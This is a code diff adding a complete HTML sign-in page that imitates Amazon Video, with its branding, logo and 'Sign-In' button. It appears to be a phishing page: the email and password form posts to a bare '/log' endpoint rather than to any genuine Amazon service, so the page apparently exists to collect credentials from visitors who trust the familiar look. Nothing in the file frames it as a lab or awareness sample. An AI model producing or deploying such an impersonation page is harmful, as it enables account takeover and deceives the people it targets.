@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Video - Sign In</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 10px;
+            background-color: #f0c14b;
+            border: 1px solid #a88734;
+            border-radius: 4px;
+            color: #111;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #767676;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+        .divider::before {
+            margin-right: .25em;
+        }
+        .divider::after {
+            margin-left: .25em;
+        }
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Amazon_Prime_Video_logo.svg/1200px-Amazon_Prime_Video_logo.svg.png" alt="Amazon Video" class="logo">
+        <h2>Sign in to Amazon Video</h2>
+        <form action="/log" method="POST">
+            <input type="text" name="email" placeholder="Email or mobile phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign-In</button>
+        </form>
+        <div class="divider">OR</div>
+        <div class="signup">New to Amazon Video? <a href="#">Start your free trial</a></div>
+    </div>
+</body>
+</html>
